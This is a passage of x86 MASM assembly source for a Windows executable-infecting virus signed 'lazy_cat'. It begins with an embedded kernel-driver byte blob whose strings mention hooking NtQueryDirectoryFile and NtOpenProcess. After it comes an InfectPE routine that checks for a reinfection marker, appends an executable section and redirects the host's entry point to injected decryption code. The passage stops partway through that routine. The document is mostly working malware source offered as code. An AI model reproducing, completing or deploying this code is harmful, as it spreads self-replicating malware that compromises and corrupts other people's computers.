		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	030h, 013h, 000h, 000h, 040h, 013h, 000h, 000h, 058h, 013h, 000h, 000h, 074h, 013h, 000h, 000h
		db	080h, 013h, 000h, 000h, 098h, 013h, 000h, 000h, 0AAh, 013h, 000h, 000h, 0C2h, 013h, 000h, 000h
		db	0D6h, 013h, 000h, 000h, 0EAh, 013h, 000h, 000h, 002h, 014h, 000h, 000h, 018h, 014h, 000h, 000h
		db	02Ah, 014h, 000h, 000h, 042h, 014h, 000h, 000h, 050h, 014h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 06Bh, 05Dh, 0CAh, 04Dh, 000h, 000h, 000h, 000h, 002h, 000h, 000h, 000h
		db	056h, 000h, 000h, 000h, 0A8h, 00Ch, 000h, 000h, 0A8h, 00Ch, 000h, 000h, 049h, 052h, 050h, 05Fh
		db	04Dh, 04Ah, 05Fh, 043h, 04Ch, 045h, 041h, 04Eh, 055h, 050h, 000h, 000h, 049h, 052h, 050h, 05Fh
		db	04Dh, 04Ah, 05Fh, 043h, 04Ch, 04Fh, 053h, 045h, 000h, 000h, 000h, 000h, 049h, 052h, 050h, 05Fh
		db	04Dh, 04Ah, 05Fh, 043h, 052h, 045h, 041h, 054h, 045h, 000h, 000h, 000h, 049h, 052h, 050h, 05Fh
		db	04Dh, 04Ah, 05Fh, 057h, 052h, 049h, 054h, 045h, 000h, 000h, 000h, 000h, 049h, 052h, 050h, 05Fh
		db	04Dh, 04Ah, 05Fh, 052h, 045h, 041h, 044h, 000h, 052h, 053h, 044h, 053h, 0DBh, 006h, 002h, 0C0h
		db	078h, 040h, 054h, 040h, 080h, 0DDh, 055h, 028h, 044h, 0ECh, 02Dh, 01Eh, 001h, 000h, 000h, 000h
		db	066h, 03Ah, 05Ch, 0E6h, 0AFh, 095h, 0E4h, 0B8h, 09Ah, 0E8h, 0AEh, 0BEh, 0E8h, 0AEh, 0A1h, 05Ch
		db	069h, 06Eh, 066h, 065h, 063h, 074h, 070h, 065h, 05Fh, 073h, 079h, 073h, 05Ch, 06Fh, 062h, 06Ah
		db	063h, 068h, 06Bh, 05Fh, 077h, 078h, 070h, 05Fh, 078h, 038h, 036h, 05Ch, 069h, 033h, 038h, 036h
		db	05Ch, 049h, 06Eh, 066h, 065h, 063h, 074h, 050h, 045h, 02Eh, 070h, 064h, 062h, 000h, 000h, 000h
		db	003h, 000h, 000h, 000h, 09Ch, 00Ch, 001h, 000h, 004h, 000h, 000h, 000h, 08Ch, 00Ch, 001h, 000h
		db	000h, 000h, 000h, 000h, 07Ch, 00Ch, 001h, 000h, 002h, 000h, 000h, 000h, 06Ch, 00Ch, 001h, 000h
		db	012h, 000h, 000h, 000h, 05Ch, 00Ch, 001h, 000h, 0BFh, 044h, 0FFh, 0FFh, 040h, 0BBh, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Eh, 074h
		db	051h, 075h, 065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h
		db	06Ch, 065h, 020h, 068h, 061h, 073h, 020h, 062h, 065h, 065h, 06Eh, 020h, 075h, 06Eh, 068h, 06Fh
		db	06Fh, 06Bh, 065h, 064h, 02Eh, 00Ah, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Eh, 074h, 04Fh, 070h, 065h, 06Eh, 050h, 072h, 06Fh, 063h
		db	065h, 073h, 073h, 020h, 068h, 061h, 073h, 020h, 062h, 065h, 065h, 06Eh, 020h, 075h, 06Eh, 068h
		db	06Fh, 06Fh, 06Bh, 065h, 064h, 02Eh, 00Ah, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 049h, 06Eh, 066h, 065h, 063h, 074h, 050h, 045h, 02Eh, 073h
		db	079h, 073h, 020h, 068h, 061h, 073h, 020h, 062h, 065h, 065h, 06Eh, 020h, 075h, 06Eh, 06Ch, 06Fh
		db	061h, 064h, 065h, 064h, 02Eh, 00Ah, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 083h, 0ECh, 008h, 08Bh, 045h, 008h, 08Bh, 048h, 004h, 089h, 04Dh
		db	0FCh, 083h, 07Dh, 0FCh, 000h, 074h, 028h, 08Bh, 055h, 0FCh, 08Bh, 042h, 028h, 089h, 045h, 0F8h
		db	083h, 07Dh, 0F8h, 000h, 074h, 019h, 08Bh, 04Dh, 0F8h, 083h, 0C1h, 004h, 051h, 0FFh, 015h, 030h
		db	00Ch, 001h, 000h, 08Bh, 055h, 0F8h, 08Bh, 002h, 050h, 0FFh, 015h, 02Ch, 00Ch, 001h, 000h, 08Bh
		db	00Dh, 004h, 00Ch, 001h, 000h, 08Bh, 051h, 001h, 0A1h, 008h, 00Ch, 001h, 000h, 08Bh, 008h, 0A1h
		db	030h, 00Dh, 001h, 000h, 089h, 004h, 091h, 08Bh, 00Dh, 000h, 00Ch, 001h, 000h, 08Bh, 051h, 001h
		db	0A1h, 008h, 00Ch, 001h, 000h, 08Bh, 008h, 0A1h, 034h, 00Dh, 001h, 000h, 089h, 004h, 091h, 068h
		db	080h, 00Dh, 001h, 000h, 0E8h, 017h, 0FDh, 0FFh, 0FFh, 083h, 0C4h, 004h, 068h, 0B8h, 00Dh, 001h
		db	000h, 0E8h, 00Ah, 0FDh, 0FFh, 0FFh, 083h, 0C4h, 004h, 068h, 0E8h, 00Dh, 001h, 000h, 0E8h, 0FDh
		db	0FCh, 0FFh, 0FFh, 083h, 0C4h, 004h, 08Bh, 0E5h, 05Dh, 0C2h, 004h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	05Ch, 000h, 044h, 000h, 065h, 000h, 076h, 000h, 069h, 000h, 063h, 000h, 065h, 000h, 05Ch, 000h
		db	049h, 000h, 06Eh, 000h, 066h, 000h, 065h, 000h, 063h, 000h, 074h, 000h, 050h, 000h, 045h, 000h
		db	000h, 000h, 000h, 000h, 05Ch, 000h, 044h, 000h, 06Fh, 000h, 073h, 000h, 044h, 000h, 065h, 000h
		db	076h, 000h, 069h, 000h, 063h, 000h, 065h, 000h, 073h, 000h, 05Ch, 000h, 049h, 000h, 06Eh, 000h
		db	066h, 000h, 065h, 000h, 063h, 000h, 074h, 000h, 050h, 000h, 045h, 000h, 000h, 000h, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 049h, 06Fh
		db	043h, 072h, 065h, 061h, 074h, 065h, 053h, 079h, 06Dh, 062h, 06Fh, 06Ch, 069h, 063h, 04Ch, 069h
		db	06Eh, 06Bh, 020h, 066h, 061h, 069h, 06Ch, 065h, 064h, 02Eh, 00Ah, 000h, 05Bh, 062h, 079h, 020h
		db	06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 049h, 06Fh, 043h, 072h, 065h, 061h
		db	074h, 065h, 044h, 065h, 076h, 069h, 063h, 065h, 020h, 066h, 061h, 069h, 06Ch, 065h, 064h, 02Eh
		db	00Ah, 000h, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h
		db	05Dh, 020h, 030h, 078h, 025h, 030h, 038h, 058h, 020h, 030h, 078h, 025h, 030h, 038h, 058h, 020h
		db	030h, 078h, 025h, 030h, 038h, 058h, 020h, 030h, 078h, 025h, 030h, 038h, 058h, 00Ah, 000h, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Eh, 074h
		db	051h, 075h, 065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh, 072h, 079h, 046h, 069h
		db	06Ch, 065h, 027h, 073h, 020h, 069h, 06Eh, 064h, 065h, 078h, 03Ah, 020h, 025h, 064h, 00Ah, 000h
		db	05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Eh, 074h
		db	04Fh, 070h, 065h, 06Eh, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 027h, 073h, 020h, 069h, 06Eh
		db	064h, 065h, 078h, 03Ah, 020h, 025h, 064h, 00Ah, 000h, 000h, 000h, 000h, 05Bh, 062h, 079h, 020h
		db	06Ch, 061h, 07Ah, 079h, 05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Fh, 072h, 069h, 067h, 069h, 06Eh
		db	061h, 06Ch, 020h, 04Eh, 074h, 051h, 075h, 065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h
		db	06Fh, 072h, 079h, 046h, 069h, 06Ch, 065h, 020h, 061h, 064h, 064h, 072h, 065h, 073h, 073h, 03Ah
		db	020h, 025h, 030h, 038h, 058h, 00Ah, 000h, 000h, 05Bh, 062h, 079h, 020h, 06Ch, 061h, 07Ah, 079h
		db	05Fh, 063h, 061h, 074h, 05Dh, 020h, 04Fh, 072h, 069h, 067h, 069h, 06Eh, 061h, 06Ch, 020h, 04Eh
		db	074h, 04Fh, 070h, 065h, 06Eh, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 020h, 061h, 064h, 064h
		db	072h, 065h, 073h, 073h, 03Ah, 020h, 025h, 030h, 038h, 058h, 00Ah, 000h, 0CCh, 0CCh, 0CCh, 0CCh
		db	0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh
		db	08Bh, 0FFh, 055h, 08Bh, 0ECh, 083h, 0ECh, 014h, 0C7h, 045h, 0FCh, 000h, 000h, 000h, 000h, 0C7h
		db	045h, 0F0h, 000h, 000h, 000h, 000h, 0C7h, 045h, 0ECh, 000h, 000h, 000h, 000h, 068h, 000h, 00Fh
		db	001h, 000h, 08Dh, 045h, 0F4h, 050h, 0FFh, 015h, 018h, 00Ch, 001h, 000h, 08Dh, 04Dh, 0F0h, 051h
		db	06Ah, 000h, 06Ah, 000h, 06Ah, 022h, 08Dh, 055h, 0F4h, 052h, 06Ah, 00Ch, 08Bh, 045h, 008h, 050h
		db	0FFh, 015h, 014h, 00Ch, 001h, 000h, 085h, 0C0h, 07Ch, 047h, 08Bh, 04Dh, 0F0h, 08Bh, 051h, 028h
		db	089h, 055h, 0ECh, 08Bh, 045h, 0ECh, 08Bh, 04Dh, 0F0h, 089h, 008h, 068h, 024h, 00Fh, 001h, 000h
		db	08Bh, 055h, 0ECh, 083h, 0C2h, 004h, 052h, 0FFh, 015h, 018h, 00Ch, 001h, 000h, 08Dh, 045h, 0F4h
		db	050h, 08Bh, 04Dh, 0ECh, 083h, 0C1h, 004h, 051h, 0FFh, 015h, 010h, 00Ch, 001h, 000h, 085h, 0C0h
		db	07Dh, 00Dh, 068h, 050h, 00Fh, 001h, 000h, 0E8h, 074h, 0FAh, 0FFh, 0FFh, 083h, 0C4h, 004h, 0EBh
		db	00Dh, 068h, 07Ch, 00Fh, 001h, 000h, 0E8h, 065h, 0FAh, 0FFh, 0FFh, 083h, 0C4h, 004h, 0C7h, 045h
		db	0FCh, 000h, 000h, 000h, 000h, 0EBh, 009h, 08Bh, 055h, 0FCh, 083h, 0C2h, 001h, 089h, 055h, 0FCh
		db	083h, 07Dh, 0FCh, 01Bh, 07Dh, 010h, 08Bh, 045h, 0FCh, 08Bh, 04Dh, 008h, 0C7h, 044h, 081h, 038h
		db	0C0h, 009h, 001h, 000h, 0EBh, 0E1h, 08Bh, 055h, 008h, 0C7h, 042h, 070h, 0D0h, 008h, 001h, 000h
		db	08Bh, 045h, 008h, 0C7h, 040h, 034h, 020h, 00Eh, 001h, 000h, 08Bh, 00Dh, 008h, 00Ch, 001h, 000h
		db	08Bh, 051h, 00Ch, 052h, 0A1h, 008h, 00Ch, 001h, 000h, 08Bh, 048h, 008h, 051h, 08Bh, 015h, 008h
		db	00Ch, 001h, 000h, 08Bh, 042h, 004h, 050h, 08Bh, 00Dh, 008h, 00Ch, 001h, 000h, 08Bh, 011h, 052h
		db	068h, 0A4h, 00Fh, 001h, 000h, 0E8h, 0F6h, 0F9h, 0FFh, 0FFh, 083h, 0C4h, 014h, 0A1h, 004h, 00Ch
		db	001h, 000h, 08Bh, 048h, 001h, 051h, 068h, 0D0h, 00Fh, 001h, 000h, 0E8h, 0E0h, 0F9h, 0FFh, 0FFh
		db	083h, 0C4h, 008h, 08Bh, 015h, 000h, 00Ch, 001h, 000h, 08Bh, 042h, 001h, 050h, 068h, 000h, 010h
		db	001h, 000h, 0E8h, 0C9h, 0F9h, 0FFh, 0FFh, 083h, 0C4h, 008h, 08Bh, 00Dh, 004h, 00Ch, 001h, 000h
		db	08Bh, 051h, 001h, 0A1h, 008h, 00Ch, 001h, 000h, 08Bh, 008h, 08Bh, 014h, 091h, 089h, 015h, 030h
		db	00Dh, 001h, 000h, 0A1h, 000h, 00Ch, 001h, 000h, 08Bh, 048h, 001h, 08Bh, 015h, 008h, 00Ch, 001h
		db	000h, 08Bh, 002h, 08Bh, 00Ch, 088h, 089h, 00Dh, 034h, 00Dh, 001h, 000h, 08Bh, 015h, 030h, 00Dh
		db	001h, 000h, 052h, 068h, 02Ch, 010h, 001h, 000h, 0E8h, 083h, 0F9h, 0FFh, 0FFh, 083h, 0C4h, 008h
		db	0A1h, 034h, 00Dh, 001h, 000h, 050h, 068h, 068h, 010h, 001h, 000h, 0E8h, 070h, 0F9h, 0FFh, 0FFh
		db	083h, 0C4h, 008h, 08Bh, 00Dh, 004h, 00Ch, 001h, 000h, 08Bh, 051h, 001h, 0A1h, 008h, 00Ch, 001h
		db	000h, 08Bh, 008h, 0C7h, 004h, 091h, 040h, 006h, 001h, 000h, 08Bh, 015h, 000h, 00Ch, 001h, 000h
		db	08Bh, 042h, 001h, 08Bh, 00Dh, 008h, 00Ch, 001h, 000h, 08Bh, 011h, 0C7h, 004h, 082h, 000h, 00Bh
		db	001h, 000h, 033h, 0C0h, 08Bh, 0E5h, 05Dh, 0C2h, 008h, 000h, 0CCh, 0CCh, 0CCh, 0CCh, 0CCh, 08Bh
		db	0FFh, 055h, 08Bh, 0ECh, 0A1h, 02Ch, 00Dh, 001h, 000h, 085h, 0C0h, 0B9h, 040h, 0BBh, 000h, 000h
		db	074h, 004h, 03Bh, 0C1h, 075h, 023h, 08Bh, 015h, 034h, 00Ch, 001h, 000h, 0B8h, 02Ch, 00Dh, 001h
		db	000h, 0C1h, 0E8h, 008h, 033h, 002h, 025h, 0FFh, 0FFh, 000h, 000h, 0A3h, 02Ch, 00Dh, 001h, 000h
		db	075h, 007h, 08Bh, 0C1h, 0A3h, 02Ch, 00Dh, 001h, 000h, 0F7h, 0D0h, 0A3h, 028h, 00Dh, 001h, 000h
		db	05Dh, 0E9h, 0EAh, 0FDh, 0FFh, 0FFh, 0CCh, 0CCh, 0F0h, 012h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 060h, 014h, 000h, 000h, 000h, 00Ch, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	030h, 013h, 000h, 000h, 040h, 013h, 000h, 000h, 058h, 013h, 000h, 000h, 074h, 013h, 000h, 000h
		db	080h, 013h, 000h, 000h, 098h, 013h, 000h, 000h, 0AAh, 013h, 000h, 000h, 0C2h, 013h, 000h, 000h
		db	0D6h, 013h, 000h, 000h, 0EAh, 013h, 000h, 000h, 002h, 014h, 000h, 000h, 018h, 014h, 000h, 000h
		db	02Ah, 014h, 000h, 000h, 042h, 014h, 000h, 000h, 050h, 014h, 000h, 000h, 000h, 000h, 000h, 000h
		db	02Eh, 005h, 05Ah, 077h, 04Fh, 070h, 065h, 06Eh, 050h, 072h, 06Fh, 063h, 065h, 073h, 073h, 000h
		db	03Dh, 005h, 05Ah, 077h, 051h, 075h, 065h, 072h, 079h, 044h, 069h, 072h, 065h, 063h, 074h, 06Fh
		db	072h, 079h, 046h, 069h, 06Ch, 065h, 000h, 000h, 04Fh, 002h, 04Bh, 065h, 053h, 065h, 072h, 076h
		db	069h, 063h, 065h, 044h, 065h, 073h, 063h, 072h, 069h, 070h, 074h, 06Fh, 072h, 054h, 061h, 062h
		db	06Ch, 065h, 000h, 000h, 030h, 000h, 044h, 062h, 067h, 050h, 072h, 069h, 06Eh, 074h, 000h, 000h
		db	046h, 001h, 049h, 06Fh, 043h, 072h, 065h, 061h, 074h, 065h, 053h, 079h, 06Dh, 062h, 06Fh, 06Ch
		db	069h, 063h, 04Ch, 069h, 06Eh, 06Bh, 000h, 000h, 03Dh, 001h, 049h, 06Fh, 043h, 072h, 065h, 061h
		db	074h, 065h, 044h, 065h, 076h, 069h, 063h, 065h, 000h, 000h, 019h, 004h, 052h, 074h, 06Ch, 049h
		db	06Eh, 069h, 074h, 055h, 06Eh, 069h, 063h, 06Fh, 064h, 065h, 053h, 074h, 072h, 069h, 06Eh, 067h
		db	000h, 000h, 04Eh, 000h, 045h, 078h, 046h, 072h, 065h, 065h, 050h, 06Fh, 06Fh, 06Ch, 057h, 069h
		db	074h, 068h, 054h, 061h, 067h, 000h, 0B6h, 003h, 052h, 074h, 06Ch, 043h, 06Fh, 06Dh, 070h, 061h
		db	072h, 065h, 04Dh, 065h, 06Dh, 06Fh, 072h, 079h, 000h, 000h, 041h, 000h, 045h, 078h, 041h, 06Ch
		db	06Ch, 06Fh, 063h, 061h, 074h, 065h, 050h, 06Fh, 06Fh, 06Ch, 057h, 069h, 074h, 068h, 054h, 061h
		db	067h, 000h, 0E0h, 001h, 049h, 06Fh, 066h, 043h, 06Fh, 06Dh, 070h, 06Ch, 065h, 074h, 065h, 052h
		db	065h, 071h, 075h, 065h, 073h, 074h, 000h, 000h, 04Eh, 001h, 049h, 06Fh, 044h, 065h, 06Ch, 065h
		db	074h, 065h, 044h, 065h, 076h, 069h, 063h, 065h, 000h, 000h, 050h, 001h, 049h, 06Fh, 044h, 065h
		db	06Ch, 065h, 074h, 065h, 053h, 079h, 06Dh, 062h, 06Fh, 06Ch, 069h, 063h, 04Ch, 069h, 06Eh, 06Bh
		db	000h, 000h, 063h, 002h, 04Bh, 065h, 054h, 069h, 063h, 06Bh, 043h, 06Fh, 075h, 06Eh, 074h, 000h
		db	0F3h, 001h, 04Bh, 065h, 042h, 075h, 067h, 043h, 068h, 065h, 063h, 06Bh, 045h, 078h, 000h, 000h
		db	06Eh, 074h, 06Fh, 073h, 06Bh, 072h, 06Eh, 06Ch, 02Eh, 065h, 078h, 065h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 06Ch, 000h, 000h, 000h, 04Ch, 036h, 080h, 036h, 0BAh, 036h, 0C8h, 036h
		db	0D5h, 036h, 0F6h, 036h, 004h, 037h, 011h, 037h, 074h, 037h, 081h, 037h, 09Ah, 037h, 022h, 038h
		db	075h, 038h, 07Ah, 038h, 0FEh, 038h, 00Fh, 039h, 015h, 039h, 052h, 039h, 0FCh, 039h, 008h, 03Ah
		db	00Eh, 03Ah, 021h, 03Ah, 02Ch, 03Ah, 03Fh, 03Ah, 007h, 03Bh, 018h, 03Bh, 021h, 03Bh, 048h, 03Bh
		db	050h, 03Bh, 077h, 03Bh, 07Dh, 03Bh, 08Bh, 03Bh, 097h, 03Bh, 0B2h, 03Bh, 004h, 03Dh, 00Ch, 03Dh
		db	014h, 03Dh, 01Ch, 03Dh, 024h, 03Dh, 04Fh, 03Eh, 05Bh, 03Eh, 061h, 03Eh, 069h, 03Eh, 070h, 03Eh
		db	079h, 03Eh, 081h, 03Eh, 088h, 03Eh, 090h, 03Eh, 09Dh, 03Eh, 0AAh, 03Eh, 000h, 010h, 000h, 000h
		db	05Ch, 000h, 000h, 000h, 0CEh, 030h, 0D8h, 030h, 0F2h, 030h, 00Ch, 031h, 019h, 031h, 02Ah, 031h
		db	033h, 031h, 042h, 031h, 070h, 031h, 07Ch, 031h, 086h, 031h, 08Ch, 031h, 095h, 031h, 09Fh, 031h
		db	0A9h, 031h, 0B1h, 031h, 0BEh, 031h, 0C7h, 031h, 0D5h, 031h, 0DEh, 031h, 0ECh, 031h, 0F4h, 031h
		db	0FFh, 031h, 004h, 032h, 00Dh, 032h, 018h, 032h, 01Eh, 032h, 024h, 032h, 031h, 032h, 037h, 032h
		db	045h, 032h, 04Dh, 032h, 056h, 032h, 05Ch, 032h, 065h, 032h, 06Eh, 032h, 085h, 032h, 098h, 032h
		db	09Dh, 032h, 0ACh, 032h, 0B5h, 032h, 0BCh, 032h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
		db	000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h, 000h
FileSize	equ	$ - SysFileBytes


.code
include		InjectCode.asm

InfectPE	proc	szFilePath:PTR BYTE
                LOCAL	hFile:DWORD
                LOCAL	dwFileSize:DWORD
                LOCAL	hMap:DWORD
                LOCAL	lpStart:DWORD
                LOCAL	pFileHeader:PTR IMAGE_FILE_HEADER
                LOCAL	pOptionalHeader:PTR IMAGE_OPTIONAL_HEADER
                LOCAL	wNumberOfSections:WORD			; IMAGE_SECTION_HEADER's count
                LOCAL	pEndSectionHeader:PTR IMAGE_SECTION_HEADER
                LOCAL	pCodeStart:DWORD			; Inject code in this file position
                LOCAL	dwNumberOfBytesWritten:DWORD
                LOCAL	dwEnytryPoint:DWORD
                LOCAL	pInfectedSignature:DWORD		; points to Entrypoint + 2h, file offset
		LOCAL	dwExtraDataSize:DWORD
		LOCAL	pExtraData:PTR BYTE
		LOCAL	dwNumberOfBytesRead:DWORD
		
                pushad
                mov	hFile, INVALID_HANDLE_VALUE
                mov	hMap, 0
                mov	lpStart, 0
                mov	dwFileSize, 0
                mov	pFileHeader, 0
                mov	pOptionalHeader, 0
                mov	pEndSectionHeader, 0
                mov	pCodeStart, 0
                mov	dwNumberOfBytesWritten, 0
		mov	pInfectedSignature,0
		mov	dwExtraDataSize,0
		mov	pExtraData,0
		.while	TRUE
			invoke	CreateFile, szFilePath, GENERIC_READ or GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
                        .break	.if	eax == INVALID_HANDLE_VALUE
			mov	hFile, eax
			invoke	GetFileSize, hFile, NULL
			.break	.if	!eax
			mov	dwFileSize, eax
			invoke	CreateFileMapping, hFile, NULL, PAGE_READWRITE, NULL, dwFileSize, NULL
			.break	.if	!eax
			mov	hMap, eax
			invoke	MapViewOfFile, hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0
			.break	.if	!eax
			mov	lpStart, eax
			assume	eax:PTR IMAGE_DOS_HEADER
			
			.break	.if	WORD PTR [eax] != 5A4Dh	; check MZ signature	
			
			mov	eax,[eax].e_lfanew
			add	eax,lpStart
			assume	eax:PTR IMAGE_NT_HEADERS
			
			.break	.if	DWORD PTR[eax] != 4550h	; check PE00 signature
			
			add	eax, 4				; Points to IMAGE_FILE_HEADER
                        mov	pFileHeader, eax
			assume	eax:PTR IMAGE_FILE_HEADER
			mov	cx, [eax].NumberOfSections
			mov	wNumberOfSections, cx
			add	eax, sizeof IMAGE_FILE_HEADER
			assume	eax:PTR IMAGE_OPTIONAL_HEADER
		
			; Check Subsystem, avoid infecting files like ntoskrnl.exe
			.break	.if	[eax].Subsystem != 2 && [eax].Subsystem != 3	
			
			mov	pOptionalHeader, eax
			push	[eax].AddressOfEntryPoint
			pop	dwEnytryPoint
			add	eax, sizeof IMAGE_OPTIONAL_HEADER	; Ponits to the first IMAGE_SECTION_HEADER
			assume	eax:PTR IMAGE_SECTION_HEADER
			
			.while	cx
				mov	edi,[eax].VirtualAddress
				cmp	dwEnytryPoint,edi
				jb	@F
				add	edi,[eax].Misc.VirtualSize
				cmp	dwEnytryPoint,edi
				jnb	@F
				push	DWORD PTR [eax].PointerToRawData
				mov	edi,dwEnytryPoint
				sub	edi,[eax].VirtualAddress
				pop	pInfectedSignature
				add	pInfectedSignature,edi
			@@:
				add	eax, sizeof IMAGE_SECTION_HEADER
				dec	cx
			.endw
			
			; Avoid infecting again and again
			.if	pInfectedSignature
				mov	edi,pInfectedSignature
				add	edi,2
				add	edi,lpStart
				.if	DWORD PTR [edi] == 'lazy' && DWORD PTR [edi+4] == '_cat'
					.break
				.endif
			.endif
			mov	pEndSectionHeader, eax
			
			; Check space, make sure there have enough space, or it will override section data
			add	eax,sizeof IMAGE_SECTION_HEADER
			sub	eax,lpStart
			mov	ecx,pOptionalHeader
			assume	ecx:PTR IMAGE_OPTIONAL_HEADER
			
			.break	.if	eax > [ecx].SizeOfHeaders
			
			; OK, this file can be infected, start infecting ...
			; Modify IMAGE_FILE_HEADER's NumberOfSections
			mov	eax,pFileHeader
			assume	eax:PTR IMAGE_FILE_HEADER
			mov	cx,[eax].NumberOfSections
			inc	cx
			mov	[eax].NumberOfSections,cx			
			
			; Modify IMAGE_OPTIONAL_HEADER's SizeOfImage
			mov	eax,pOptionalHeader
			assume	eax:PTR IMAGE_OPTIONAL_HEADER
			mov	ecx,[eax].SizeOfImage
			add	ecx,1000h		; HARDCODE
			mov	[eax].SizeOfImage,ecx
			
			; Filled IMAGE_SECTION_HEADER structure
			mov	edi,pEndSectionHeader
			mov	esi,edi
			sub	esi,sizeof IMAGE_SECTION_HEADER
			assume	esi:PTR IMAGE_SECTION_HEADER	; last
			assume	edi:PTR IMAGE_SECTION_HEADER	; past-the-end
			
                        ; PointerToRawData, previous
                        mov	ecx,[esi].PointerToRawData
                        add	ecx,[esi].SizeOfRawData
                        mov	[edi].PointerToRawData,ecx
                        ; SizeOfRawData
                        mov	[edi].SizeOfRawData,1000h	; HARDCODE
                        ; VirtualAddress, align with 1000h
                        mov	ecx,[esi].VirtualAddress
                        add	ecx,[esi].Misc.VirtualSize
                        push	ecx
                        and	ecx,0FFFh
                        pop	eax
                        shr	eax,12
                        .if	ecx
			        inc	eax
                        .endif
                        shl	eax,12
                        mov	[edi].VirtualAddress,eax
                        ; VirtualSize
                        mov	[edi].Misc.VirtualSize,1000h	; HARDCODE
                        ; Characteristics
                        mov	[edi].Characteristics,0E0000020h
                        ; Generate a random Name. Last 4 bytes is not used, later I will it used to save OEP
			invoke	GetTickCount
                        invoke	_imp__srand,eax
                        lea	edi,[edi].Name1
                        mov	ebx,64
                        mov	cx,4
                        .while	cx
                                push	cx
                        invoke	_imp__rand
                                xor	edx,edx
                                div	ebx
                                add	dx,'!'
                                mov	BYTE PTR [edi],dl
                                inc	edi
                                pop	cx
                                dec	cx
			.endw		
			
                        ; save OEP(保存的是ImageBase + AddressOfEntryPoint,而不是RVA)
                        mov	eax, pOptionalHeader
                        assume	eax:ptr IMAGE_OPTIONAL_HEADER
                        mov	ecx,[eax].AddressOfEntryPoint
                        add     ecx,[eax].ImageBase
                        mov	dword ptr [edi],ecx
			
                        ; Modify IMAGE_OPTIONAL_HEADER's AddressOfEntryPoint member	
                        mov	ecx, pEndSectionHeader
                        assume	ecx:ptr IMAGE_SECTION_HEADER
                        mov	ecx,[ecx].VirtualAddress
                        add	ecx,offset Decryption
			sub	ecx,offset INJECTCODE_START
                        mov	[eax].AddressOfEntryPoint,ecx
			
			; check extra data
			mov	edi,pEndSectionHeader
			sub	edi,sizeof IMAGE_SECTION_HEADER
